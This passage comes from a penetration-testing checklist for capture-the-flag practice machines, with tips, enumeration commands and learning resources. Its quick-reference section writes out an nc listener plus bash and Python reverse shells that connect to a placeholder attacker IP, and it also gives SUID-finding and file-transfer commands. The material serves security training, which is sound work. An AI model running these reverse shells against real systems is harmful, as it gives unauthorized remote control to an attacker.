  - Check routing tables
  - Use correct network interfaces

#### Privilege Escalation Failures
- [ ] **SUID Not Working**:
  - Check for `nosuid` mount options
  - Verify binary permissions
  - Look for alternative escalation paths

- [ ] **Sudo Restrictions**:
  - Check for command restrictions
  - Look for sudo version vulnerabilities
  - Try alternative privilege escalation methods

### Pro Tips for Easy/Medium Machines

#### Time Management
- [ ] **Enumeration Focus**: Spend 60% of time on enumeration
- [ ] **Tool Rotation**: If one tool doesn't work, try alternatives
- [ ] **Note Everything**: Keep detailed notes of all findings
- [ ] **Regular Breaks**: Take breaks to maintain focus

#### Strategic Approach
- [ ] **Low-Hanging Fruit**: Always check for default credentials first
- [ ] **Version Checking**: Always identify software versions
- [ ] **Multiple Vectors**: Try different attack vectors simultaneously
- [ ] **Documentation**: Document working exploits for future reference

#### Common Oversights
- [ ] **Hidden Directories**: Don't forget about .git, .svn, .DS_Store
- [ ] **Alternative Ports**: Check for services on non-standard ports
- [ ] **File Extensions**: Try multiple extensions in directory brute-forcing
- [ ] **User-Agent Strings**: Some applications filter based on User-Agent

### Emergency Procedures

#### When Stuck
1. **Reset the Machine**: Sometimes machines get corrupted
2. **Re-read All Output**: Look for missed clues in tool output
3. **Try Different Wordlists**: Use larger or specialized wordlists
4. **Check Forums**: Look for hints (without spoilers) on platforms
5. **Take a Break**: Sometimes a fresh perspective helps

#### Clean Up
- [ ] **Remove Uploaded Files**: Clean up any files uploaded during testing
- [ ] **Kill Background Processes**: Stop any long-running scans
- [ ] **Document Lessons Learned**: Note what worked and what didn't

---

## üìã Quick Reference Commands

### One-Liners for Quick Wins

#### Network Discovery
```bash
# Quick network scan
nmap -sn 192.168.1.0/24

# Fast port scan
nmap --top-ports 1000 --open <target>

# Service detection
nmap -sV --version-intensity 9 -p <ports> <target>
```

#### Web Enumeration
```bash
# Quick directory scan
gobuster dir -u http://<target> -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,txt,html

# Technology detection
whatweb http://<target>

# Certificate information
openssl s_client -connect <target>:443 2>/dev/null | openssl x509 -noout -text
```

#### File Transfers
```bash
# HTTP server
python3 -m http.server 8000

# Download file
wget http://<server>/file -O /tmp/file
curl http://<server>/file -o /tmp/file

# Upload file (if upload functionality exists)
curl -F "file=@/path/to/file" http://<target>/upload.php
```

#### Reverse Shells
```bash
# Listener
nc -nvlp 4444

# Basic bash reverse shell
bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1

# Python reverse shell
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacker_ip>",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### Platform-Specific Quick Commands

#### Linux Enumeration
```bash
# System info
uname -a && cat /etc/os-release

# Find SUID binaries
find / -perm -u=s -type f 2>/dev/null

# Check sudo permissions
sudo -l

# Network connections
ss -tulpn

# Processes
ps aux --forest
```

#### Windows Enumeration
```cmd
# System info
systeminfo

# User info
whoami /all

# Network connections
netstat -ano

# Services
sc query

# Scheduled tasks
schtasks /query /fo LIST /v
```

---

## üéì Learning & Improvement

### Skill Development Areas

#### Technical Skills
- [ ] **Network Protocols**: Deep understanding of TCP/IP, HTTP, SMB, etc.
- [ ] **Web Technologies**: HTML, JavaScript, PHP, databases
- [ ] **Operating Systems**: Linux and Windows internals
- [ ] **Scripting**: Python, Bash, PowerShell for automation
- [ ] **Cryptography**: Understanding of encryption, hashing, certificates

#### Soft Skills
- [ ] **Patience**: Enumeration takes time
- [ ] **Attention to Detail**: Small details often lead to breakthrough
- [ ] **Problem Solving**: Creative thinking for unusual scenarios
- [ ] **Documentation**: Clear note-taking and reporting

### Continuous Learning Resources

#### Platforms
- [ ] **Hack The Box**: Progressive difficulty challenges
- [ ] **TryHackMe**: Guided learning paths
- [ ] **VulnHub**: Vulnerable VMs for practice
- [ ] **PentesterLab**: Web application security focus
- [ ] **OverTheWire**: Command line and scripting challenges

#### Communities
- [ ] **Discord/Reddit**: Active communities for help and discussion
- [ ] **YouTube**: Walkthrough videos and tutorials
- [ ] **Blogs**: Security researcher blogs and writeups
- [ ] **Conferences**: DEF CON, Black Hat, BSides presentations

### Certification Paths
- [ ] **OSCP**: Offensive Security Certified Professional
- [ ] **PNPT**: Practical Network Penetration Tester
- [ ] **eJPT**: eLearnSecurity Junior Penetration Tester
- [ ] **CEH**: Certified Ethical Hacker

---

## ‚ö†Ô∏è Final Reminders

### Legal & Ethical Considerations
- [ ] **Authorization**: Only test systems you own or have explicit permission to test
- [ ] **Documentation**: Keep detailed logs of all activities
- [ ] **Responsible Disclosure**: Report vulnerabilities through proper channels
- [ ] **Cleanup**: Remove any artifacts left during testing

### Best Practices
- [ ] **Stay Updated**: Keep tools and techniques current
- [ ] **Practice Regularly**: Consistent practice improves skills
- [ ] **Share Knowledge**: Contribute to the community through writeups
- [ ] **Stay Curious**: Always be learning new techniques and technologies

### Success Metrics
- [ ] **Completion Rate**: Track your success rate on different difficulty levels
- [ ] **Time Management**: Improve your time to completion
- [ ] **Technique Variety**: Expand your toolkit regularly
- [ ] **Documentation Quality**: Improve your reporting and note-taking

---

*Remember: This checklist is a guide, not a rigid framework. Adapt it to your style and the specific challenges you encounter. The key to success in penetration testing is thorough enumeration, creative thinking, and persistent practice.*